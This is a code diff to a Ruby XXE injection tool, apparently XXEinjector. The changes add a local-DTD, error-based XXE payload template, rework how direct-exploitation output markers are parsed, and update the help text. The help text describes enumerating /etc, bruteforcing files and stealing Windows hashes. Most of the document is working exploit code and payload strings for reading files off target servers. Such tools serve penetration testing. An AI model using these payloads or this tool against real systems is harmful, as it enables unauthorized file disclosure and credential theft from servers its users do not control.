@@ -3,6 +3,7 @@
 require 'socket'
 require 'fileutils'
 require 'uri'
+require 'cgi'
 require 'net/http'
 require 'net/https'
 require 'base64'
@@ -111,7 +112,7 @@ ARGV.each do |arg|
 end
 
 # show DTD to inject
-if ARGV.include? "--dtd"
+if ARGV.include? "--oob-xml"
 	if host == ""
 		host = "YOUR_HOST"
 	end
@@ -124,9 +125,16 @@ if ARGV.include? "--dtd"
 	exit(1)
 
 # show sample direct exploitation XML
-elsif ARGV.include? "--xml"
+elsif ARGV.include? "--direct-xml"
 	puts ""
 	puts "<!DOCTYPE m [ <!ENTITY direct SYSTEM \"XXEINJECT\">]><tag>UNIQUEMARK&direct;UNIQUEMARK</tag>"
+	puts ""
+	exit(1)
+
+# show sample direct exploitation XML using local DTD
+elsif ARGV.include? "--localdtd-xml"
+	puts ""
+	puts "<!DOCTYPE m [ <!ENTITY % local_dtd SYSTEM \"PUT_HERE_PATH_TO_LOCAL_DTD\"><!ENTITY % SuperClass '><!ENTITY &#x25; file SYSTEM \"XXEINJECT\"><!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">&#x25;eval;&#x25;error;'>%local_dtd;]>"
 	puts ""
 	exit(1)
 
@@ -160,7 +168,7 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts "  --rport	Remote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)"
 	puts ""
 	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
-	puts "  --direct	Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)"
+	puts "  --direct	Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --direct-xml to see how XML in request file should look like or --localdtd-xml if you want to use local DTD during exploitation. In case of any problems with start and end marks when special characters are present in reponse before or after output data please use Burp Proxy match and replace option to replace that. (--direct=UNIQUEMARKSTART,UNIQUEMARKEND)"
 	puts "  --cdata	Improve direct exploitation with CDATA. Data is retrieved directly, however OOB is used to construct CDATA payload. Specify --cdata-xml to see how request should look like in this technique."
 	puts "  --2ndfile	File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
 	puts "  --phpfilter	Use PHP filter to base64 encode target file before sending."
@@ -182,7 +190,7 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts ""
 	puts "  --test	This mode shows request with injected payload and quits. Used to verify correctness of request without sending it to a server."
 	puts "  --urlencode	URL encode injected DTD. This is default for URI."
-	puts "  --nodtd	If you want to put DTD in request by yourself. Specify \"--dtd\" to show how DTD should look like."
+	puts "  --nodtd	If you want to put DTD in request by yourself. Specify \"--oob-xml\" to show how DTD should look like."
 	puts "  --output	Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)"
 	puts "  --timeout	Timeout for receiving file/directory content. (--timeout=20)"
 	puts "  --contimeout	Timeout for closing connection with server. This is used to prevent DoS condition. (--contimeout=20)"
@@ -199,7 +207,7 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts "  Bruteforcing files using HTTP out of band method and netdoc protocol:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc"
 	puts "  Enumerating using direct exploitation:"
-	puts "  ruby #{__FILE__} --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK"
+	puts "  ruby #{__FILE__} --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARKSTART,UNIQUEMARKEND"
 	puts "  Enumerating unfiltered ports:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --enumports=all"
 	puts "  Stealing Windows hashes:"
@@ -281,7 +289,7 @@ def configreq()
 	# get URI path
 	$uri = File.readlines($file)[0].split(" ")[1]
 	if $dtdi == "y"
-		turi = URI.decode($uri).gsub("+", " ")
+		turi = CGI.unescape($uri).gsub("+", " ")
 		if turi.include?("XXEINJECT")
 			if $direct != ""
 				$uri = $uri.sub("XXEINJECT", $rproto + ":///#{$directpath}")
@@ -367,7 +375,7 @@ def configreq()
 		break if File.readlines($file)[i].nil?
 		postline = File.readlines($file)[i]
 		if $dtdi == "y"
-			tline = URI.decode(postline).gsub("+", " ")
+			tline = CGI.unescape(postline).gsub("+", " ")
 			if tline.include?("XXEINJECT") && $xslt == "n"
 				if $direct != ""
 					postline = postline.sub("XXEINJECT", $rproto + ":///#{$directpath}")
@@ -844,8 +852,6 @@ loop do
 			puts "[+] Retrieved data:"
 			req.split(splitter).each do |param|
 
-				param = URI.decode(param)
-
 				# logging to file
 				log(param + "\n")
 
@@ -1125,16 +1131,17 @@ if $brute == ""
 		configreq()
 		sendreq()
 		send2ndreq() if $secfile != ""
-		if !$response.body.include?("#{$direct}")
+		if !$response.body.include?("#{$direct.split(",")[0]}")
 			puts "[-] Response does not contain unique mark."
 			exit(1)
 		else
-			if $response.body.include?("#{$direct}#{$direct}")
+			if $response.body.include?("#{$direct.split(",")[0]}#{$direct.split(",")[1]}")
 				puts "[-] File/directory could not be retrieved."
 				exit(1)
 			else
 				puts "[+] Retrieved data:"
-				$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
+				
+				$response.body[/(#{$direct.split(",")[0]})(.*)(#{$direct.split(",")[1]})/m].gsub("#{$direct.split(",")[0]}", "\n").gsub("#{$direct.split(",")[1]}", "\n").split("\n").each do |param|
 					
 					# log to separate file
 					log(param + "\n")
@@ -1176,7 +1183,9 @@ loop do
 			# Read next line
 			line = $filenames[i]
 			line = line.chomp
-			line = line.gsub(' ','%20')
+			if $urlencode == "y"
+				line = line.gsub(' ','%20')
+			end
 		
 			# Check if a file should be enumerated
 			check = "#{$path}/#{line}".split("/")[0..-2].join('/')
@@ -1253,15 +1262,15 @@ loop do
 						end
 					end
 				else
-					if not $response.body.include?("#{$direct}")
+					if not $response.body.include?("#{$direct.split(",")[0]}")
 						puts "[-] Response does not contain unique mark."
 					else
-						if $response.body.include?("#{$direct}#{$direct}")
+						if $response.body.include?("#{$direct.split(",")[0]}#{$direct.split(",")[1]}")
 							puts "[-] File/directory could not be retrieved."
 						else
 							$done = 0
 							puts "[+] Retrieved data:"
-							$response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n").split("\n").each do |param|				
+							$response.body[/(#{$direct.split(",")[0]})(.*)(#{$direct.split(",")[1]})/m].gsub("#{$direct.split(",")[0]}", "\n").gsub("#{$direct.split(",")[1]}", "\n").split("\n").each do |param|				
 
 								# log to separate file
 								log(param + "\n")
@@ -1319,11 +1328,11 @@ loop do
 		send2ndreq() if $secfile != ""
 
 		if $direct != ""
-			if not $response.body.include?("#{$direct}")
+			if not $response.body.include?("#{$direct.split(",")[0]}")
 				puts "[-] Response does not contain unique mark." if $verbose == "y"
 			else
 				log = File.open($output, "a")
-				log.write $response.body[/(#{$direct})(.*)(#{$direct})/m].gsub("#{$direct}", "\n") + "\n"
+				log.write $response.body[/(#{$direct.split(",")[0]})(.*)(#{$direct.split(",")[1]})/m].gsub("#{$direct.split(",")[0]}", "\n").gsub("#{$direct.split(",")[1]}", "\n") + "\n"
 				puts "[+] Bruteforced request logged: #{$directpath}" if $verbose == "y"
 				log.close
 			end
